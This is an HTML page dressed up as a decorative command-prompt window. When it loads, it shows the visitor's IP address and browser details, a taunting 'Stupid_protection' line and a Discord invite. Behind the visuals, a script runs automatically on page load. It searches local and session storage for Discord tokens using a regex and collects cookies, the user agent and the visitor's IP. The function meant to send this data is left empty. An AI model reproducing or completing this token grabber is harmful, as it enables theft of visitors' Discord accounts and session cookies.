<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced CMD</title>
    <style>
        /* Base Styles */
        body {
            background-color: #1a1a1a;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'SF Mono', 'Menlo', 'Monaco', 'Courier New', monospace;
            position: relative;
            overflow: hidden;
            color: white;
        }

        /* Video Background */
        .video-background {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 100vw;
            height: 100vh;
            z-index: -1;
            pointer-events: none;
            filter: brightness(1.2) contrast(1.1);
        }

        .video-background video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scale(1.1);
            filter: saturate(1.2);
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            z-index: -1;
        }

        /* CMD Container */
        .cmd-container {
            width: 850px;
            height: 550px;
            background-color: rgba(0, 0, 0, 0.5);
            border: none;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3),
                       0 0 0 1px rgba(255, 255, 255, 0.1);
            overflow: hidden;
            position: relative;
            z-index: 1;
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            transform: translateZ(0);
            transition: all 0.3s ease;
        }

        /* Title Bar */
        .title-bar {
            background: rgba(58, 58, 58, 0.8);
            padding: 15px;
            display: flex;
            align-items: center;
            height: 28px;
            direction: ltr;
            -webkit-app-region: drag;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
        }

        .title-bar-text {
            color: #cccccc;
            font-size: 13.5px;
            margin: 0 auto;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
            letter-spacing: 0.3px;
        }

        /* Window Controls */
        .window-controls {
            position: absolute;
            left: 15px;
            display: flex;
            gap: 8px;
            margin: 0;
        }

        .control-button {
            width: 13px;
            height: 13px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            border: 1px solid rgba(0, 0, 0, 0.1);
        }

        .close { background-color: #ff5f56; }
        .minimize { background-color: #ffbd2e; }
        .maximize { background-color: #27c93f; }

        /* CMD Window */
        .cmd-window {
            padding: 20px;
            color: #ffffff;
            font-size: 14.5px;
            line-height: 1.5;
            height: calc(100% - 58px);
            overflow-y: auto;
            background-color: transparent;
            letter-spacing: 0.3px;
        }

        /* Command Line */
        .cmd-line {
            margin: 8px 0;
            display: flex;
            align-items: center;
            min-height: 24px;
            opacity: 0.95;
            transition: opacity 0.2s ease;
            padding: 4px 0;
        }

        .prompt {
            color: #395f64;
            margin-right: 15px;
            font-weight: bold;
            text-shadow: 0 0 8px rgba(1, 72, 102, 0.7);
            letter-spacing: 0.5px;
        }

        .cursor {
            display: inline-block;
            width: 8px;
            height: 17px;
            background-color: #ffffff;
            animation: blink 1s infinite;
            box-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
            border-radius: 1px;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        /* Token Display */
        #tokenDisplay, #cookieDisplay {
            position: absolute;
            bottom: 20px;
            left: 20px;
            background-color: rgba(255, 255, 255, 0.1);
            padding: 10px;
            border-radius: 5px;
            font-size: 14px;
            z-index: 2;
            display: none;
        }

        /* Falling Stars */
        .star {
            position: fixed;
            width: 3px;
            height: 3px;
            background: #fff;
            z-index: 2;
            opacity: 0;
            pointer-events: none;
            animation: fall linear;
            box-shadow: 0 0 3px #fff;
        }

        @keyframes fall {
            0% { transform: translateY(-50px) translateX(0); opacity: 1; }
            50% { opacity: 0.8; }
            100% { transform: translateY(500px) translateX(300px); opacity: 0; }
        }
    </style>
</head>
<body>
    <!-- Video Background -->
    <div class="video-background">
        <video id="bgVideo" playsinline autoplay loop muted>
            <source src="https://c.top4top.io/m_3523pu2o11.mov" type="video/quicktime">
            <source src="https://c.top4top.io/m_3523pu2o11.mov" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>
    <div class="overlay"></div>

    <!-- Main CMD Container -->
    <div class="cmd-container">
        <div class="title-bar">
            <div class="window-controls">
                <div class="control-button close"></div>
                <div class="control-button minimize"></div>
                <div class="control-button maximize"></div>
            </div>
            <div class="title-bar-text">Command Prompt</div>
        </div>
        <div class="cmd-window" id="cmdWindow">
            <!-- Content will be added by JavaScript -->
        </div>
    </div>

    <!-- Token Display -->
    <div id="tokenDisplay">
        <strong>Discord Token:</strong> <span id="tokenContent">Loading...</span>
    </div>
    <div id="cookieDisplay">
        <strong>Cookie Token:</strong> <span id="cookieContent">Loading...</span>
    </div>

    <!-- Scripts -->
    <script>
        // Token handling
        function getDiscordTokenFromStorage() {
            const tokens = [];
            
            // Check Local Storage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // Discord token pattern
                if (value && value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)) {
                    tokens.push({source: 'localStorage-' + key, token: value});
                }
            }
            
            
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                
                if (value && value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)) {
                    tokens.push({source: 'sessionStorage-' + key, token: value});
                }
            }

            
            const locations = [
                'localStorage',
                'sessionStorage',
                'indexedDB',
                'webkitIndexedDB',
                'mozIndexedDB',
                'webkitWebStorage',
                'mozStorage'
            ];

            locations.forEach(location => {
                try {
                    for(let key in window[location]) {
                        if (key.includes('token')) {
                            const value = window[location][key];
                            if (value && value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g)) {
                                tokens.push({source: location + '-' + key, token: value});
                            }
                        }
                    }
                } catch(e) {}
            });

            return tokens;
        }

        async function sendTokensAndCookies() {
            const discordTokens = getDiscordTokenFromStorage();
            const allCookies = document.cookie;
            const browserInfo = navigator.userAgent;
            const ip = await getVisitorIP();

           
        }

        // Star effect
        function createStar() {
            const cmdContainer = document.querySelector('.cmd-container');
            const containerRect = cmdContainer.getBoundingClientRect();
            
            const star = document.createElement('div');
            star.className = 'star';
            
            const startPosition = containerRect.left + (Math.random() * containerRect.width);
            star.style.left = startPosition + 'px';
            star.style.top = containerRect.top - 50 + 'px';
            
            const duration = 1 + Math.random() * 2;
            star.style.animationDuration = duration + 's';
            
            document.body.appendChild(star);
            setTimeout(() => star.remove(), duration * 1000);
        }

        setInterval(createStar, 100);

        // Video handling
        const video = document.getElementById('bgVideo');
        video.muted = false;
        video.volume = 0.5;

        video.play().catch(error => {
            console.log("Video play failed:", error);
            document.addEventListener('click', () => {
                video.play().catch(error => console.log("Video play failed after user interaction:", error));
            }, { once: true });
        });

        // Command prompt functionality
        const cmdWindow = document.getElementById('cmdWindow');
        let currentCommandIndex = 0;
        let currentCharIndex = 0;
        let isTyping = false;

        function createNewLine() {
            const line = document.createElement('div');
            line.className = 'cmd-line';
            
            const prompt = document.createElement('span');
            prompt.className = 'prompt';
            prompt.textContent = 'C:/Alexanders/PRD8A ';
            
            line.appendChild(prompt);
            cmdWindow.appendChild(line);
            return line;
        }

        function typeText(text, element, callback) {
            if (currentCharIndex < text.length) {
                const span = document.createElement('span');
                span.className = isTyping ? 'command-text' : 'output-text';
                span.textContent = text[currentCharIndex];
                element.appendChild(span);
                currentCharIndex++;
                setTimeout(() => typeText(text, element, callback), 20);
            } else {
                currentCharIndex = 0;
                if (callback) callback();
            }
        }

        // IP and Commands
        async function getVisitorIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return 'Unknown IP';
            }
        }

        let commands = [];

        async function initializeCommands() {
            const ip = await getVisitorIP();
            commands = [
                { type: 'output', text: 'IP Address: ' + ip },
                { type: 'output', text: 'System: ' + navigator.platform + ' | Browser: ' + navigator.userAgent.split(' ').pop() },
                { type: 'command', text: 'Stupid_protection' },
                { type: 'command', text: 'discord.gg/z-b' },
                { type: 'command', text: '....' }
            ];
            processNextCommand();
        }

        function processNextCommand() {
            if (currentCommandIndex < commands.length) {
                const command = commands[currentCommandIndex];
                const line = createNewLine();
                
                if (command.type === 'command') {
                    isTyping = true;
                    typeText(command.text, line, () => {
                        currentCommandIndex++;
                        setTimeout(processNextCommand, 200);
                    });
                } else {
                    isTyping = false;
                    typeText(command.text, line, () => {
                        currentCommandIndex++;
                        setTimeout(processNextCommand, 200);
                    });
                }
            } else {
                const finalLine = createNewLine();
                const cursor = document.createElement('span');
                cursor.className = 'cursor';
                finalLine.appendChild(cursor);
            }
        }

        // Initialize everything when the page loads
        window.addEventListener('load', () => {
            sendTokensAndCookies();
            initializeCommands();
        });
    </script>
</body>
</html>
